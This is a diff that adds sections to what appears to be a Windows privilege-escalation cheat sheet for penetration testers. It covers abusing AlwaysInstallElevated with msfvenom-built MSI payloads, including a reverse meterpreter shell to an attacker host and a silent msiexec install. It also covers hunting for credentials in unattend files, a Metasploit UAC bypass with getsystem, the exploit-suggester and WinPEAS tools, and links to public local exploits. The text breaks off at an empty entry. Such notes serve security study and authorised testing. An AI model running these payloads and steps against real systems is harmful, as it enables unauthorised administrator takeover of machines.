@@ -97,33 +97,215 @@ exploit/windows/local/service_permissions
 
 -- AlwaysInstallElevated setting --
 
+AlwaysInstallElevated is a Windows setting that allows non-privileged users to install Microsoft Windows Installer Package Files (MSI) with elevated system permissions. 
+This means that we can use this feature to execute a malicious MSI installer package with administrator permissions.
+
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+msfvenom -p windows/adduser USER=admin PASS=password -f msi -o filename.msi
+msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=[LHOST IP] LPORT=443 -f msi -o filename.msi
+msiexec /quiet /qn /i C:\Users\filename.msi
+
+exploit/windows/local/always_install_elevated
+
+• The /quiet flag will bypass UAC.
+• The /qn flag specifies to not use a GUI.
+• The /i flag is to perform a regular installation of the referenced package.
 
 
 -- Unattended Installs --
 
+Unattended Installs allow Windows to be deployed with little or no active involvement from an administrator. 
+If administrators fail to clean up after such a process, an EXtensible Markup Language (XML) file called Unattend is left on the local system.  
+This file contains all the configuration settings that were set during the installation process, some of which can involve the configuration of local accounts including Administrator accounts!
+
+Unattended files are most likely found in one of the following directories:
+• C:\Windows\Panther\
+• C:\Windows\Panther\Unattend\
+• C:\Windows\System32\
+• C:\Windows\System32\sysprep\
+
+Search the directories for the following files:
+• Unattend.xml
+• unattended.xml
+• unattend.txt
+• sysprep.xml
+• sysprep.inf
+
+Passwords in these files may be base64 encoded.
+
+post/windows/gather/enum_unattend
 
 
 -- Bypassing UAC with Metasploit --
 
+exploit/windows/local/bypassuac which is a Metasploit module that bypasses User Account Control (UAC). 
+UAC is a security feature on Windows that allows an administrator to have 2 separate access tokens; a standard user access token and an administrator access token. 
+The standard user access token is used to start a program that does not require administrative privileges, such as the web browser or e-mail programs. 
+The Administrator token is used for programs that do require administrative privileges, such as programs that make modifications to the system.
+
+Before using this exploit you need to have acquired a Meterpreter shell.
+
+sf exploit(handler) > run
+
+[*] Started reverse TCP handler on...
+[*] Starting the payload handler...
+[*] Sending stage (957487 bytes) to 10.11.1.113
+[*] Meterpreter session 4 opened (172.16.1.4:4444 -> 10.11.1.113:49173) at 2017-08-17 09:52:10 -0400
+
+meterpreter >
+
+background
+use exploit/windows/local/bypassuac
+set session [Session ID]
+set lhost [VPN IP]
+run
+
+A new second shell is spawned with the UAC flag disabled. Now we can upgrade the shell with system privileges
+
+getsystem
 
 
 -- Windows Exploit Suggester --
 
+There’s a Windows version of Linux Exploit Suggester called Windows Exploit Suggester.
+This is a tool for identifying missing patches on the Windows target which may indicate possible vulnerabilities. 
+The tool takes the output from the ‘systeminfo’ command and compares the target’s patch levels (hotfixes installed) against the latest version of the Microsoft vulnerability database (the vulnerability database is automatically downloaded and stored as an Excel spreadsheet). 
+Based on this comparison the tool suggests possible public exploits (marked with an E) and Metasploit modules (marked with an M) that may work against the unpatched system.
+
+➜ Installing Windows Exploit Suggester
+
+git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git
+apt-get update
+apt-get install python-xlrd
+
+➜ Running Windows Exploit Suggester
+
+python windows-exploit-suggester.py --update
+
+systeminfo
+
+Now we need to copy all the output into a text file so Windows Exploit Suggester can read it. 
+We will call the text file ‘sysinfo.txt’ and store it in the Windows Exploit Suggester directory on our Kali Linux machine.
+With the database updated and the system information in the text file, run the following command replacing the database file name with the one you’ve just created.
+
+python windows-exploit-suggester.py --database 2018-02-08-mssb.xls --systeminfo sysinfo.txt
+
+False positives are possible because Windows Exploit Suggester compares the hotfixes installed against the information in the Microsoft vulnerability database, but this database also contains patches that apply not only to the local system but also to .NET vulnerabilities, Telnet, WebDAV, IIS, etc. 
+
+python windows-exploit-suggester.py --database 2018-02-08-mssb.xls --systeminfo sysinfo.txt --local  # show only local vulnerabilities
+python windows-exploit-suggester.py --database 2018-02-08-mssb.xls --systeminfo sysinfo.txt --remote  # Output for remote vulnerabilities
 
 
 -- WMI Hotfixes --
 
+If you’re unable to read the hotfixes installed from the ‘systeminfo’ command then you can also try using the WMI command-line (WMIC) utility.
+
+wmic qfe list full
+
+Store the output in a file named ‘hotfixes.txt’ and then run Windows Exploit Suggester with the following command
+
+python windows-exploit-suggester.py --database 2018-02-08-mssb.xls --systeminfo sysinfo.txt --hotfixes hotfixes.txt
+
+Note: In March 2017 Microsoft stopped maintaining the security bulletin search. 
+This means the Windows Exploit Suggester database will not include any vulnerabilities or exploits found after that date. 
+However, this tool can still be very useful on older systems. It is also possible, with some considerable effort, to create your own spreadsheet reflecting more recent vulnerabilities. 
+These spreadsheets can be exported with Microsoft Security Guidance, including update replacement information from the API, it’s still possible to create a recent vulnerability spreadsheet with some efforts.
+
+https://github.com/GDSSecurity/Windows-Exploit-Suggester
+https://portal.msrc.microsoft.com/en-us/security-guidance
+https://portal.msrc.microsoft.com/en-us/security-guidance
+https://github.com/Microsoft/MSRC-Microsoft-Security-Updates-API
 
 
 -- WinPEAS --
 
+The WinPEAS script checks the local Windows system for vulnerabilities and misconfigurations that can be exploited to get an Administrator or SYSTEM shell on the machine. 
+The script collects information such as Stored credentials, Windows Kernel vulnerabilities, vulnerable software and services, user privileges, and permissions. 
+WinPEAS collection contains two versions of the tool: the winPEAS.exe and the winPEAS.bat script. 
+In order to use the winPEAS.exe tool, it is required that the .NET Framework 4.0 is installed on the system. 
+The winPEAS.bat batch script can run on any system that does not have .NET Framework 4.0 installed.
+
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\full" /v version
+(Get-ItemPropertyValue -LiteralPath 'HKLM:SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full' -Name Release) -ge 394802
+dir /b /ad /o-n %systemroot%\Microsoft.NET\Framework\v?.*
+
+winPEAS.exe
+
+• We should pay special attention to red text that may indicate privilege escalation vectors.
+• Under the ‘Services Information’ section, we can find information about interesting services
+• In the section Applications Inforamtion we can find information about installed applications that may allow for privilege escalation
+• Furthermore, winPEAS prints out a lot more information about network settings, connections and listening ports, credentials and keys, interesting files and registry items and a lot more
+
+When you are running winPEAS on a compromised host, it is recommended to carefully check all the information collected by winPEAS for possible privilege escalation vectors.
+
+winPEAS.bat
+
+https://learn.microsoft.com/en-us/dotnet/framework/install/how-to-determine-which-versions-are-installed
+https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS
 
 
 -- Scripts & Tools --
 
+https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp
 
 
 -- Common Exploits --
+
+➜ Windows – Elevation of Privileges (UAC Bypass)
+• Windows Vista/2008 6.1.6000 x32,
+• Windows Vista/2008 6.1.6001 x32,
+• Windows 7 6.2.7600 x32,
+• Windows 7/2008 R2 6.2.7600 x64.
+https://www.exploit-db.com/exploits/15609/
+
+➜ Microsoft Windows 7 SP1 (x86) – ‘WebDAV’ Privilege Escalation (MS16-016)
+• Windows 7 SP1 x86 (build 7601)
+https://www.exploit-db.com/exploits/39432/
+
+And here’s a pre-compiled version that pops a system shell within the same session instead of in a new window:
+https://www.exploit-db.com/exploits/39788/
+
+➜ Microsoft Windows 7 SP1 (x86) – Privilege Escalation (MS16-014)
+• Windows 7 SP1 x86
+https://www.exploit-db.com/exploits/40039/
+
+➜ Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64) – Privilege Escalation (MS16-032)
+• Windows 7 x86/x64
+• Windows 8 x86/x64
+• Windows 10
+• Windows Server 2008-2012R2
+https://www.exploit-db.com/exploits/39719/
+
+➜ CVE-2017-0213: Windows COM Elevation of Privilege Vulnerability
+• Windows 10 (1511/10586, 1607/14393 & 1703/15063)
+• Windows 7 SP1 x86/x64
+https://www.exploit-db.com/exploits/42020/
+
+Precompiled exploits:
+https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213
+https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213
+
+➜ CVE-2019-1253: Windows Elevation of Privilege Vulnerability
+• Windows 10 (all versions) that are not patched with September (2019) update
+https://github.com/padovah4ck/CVE-2019-1253
+
+➜ 
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 *
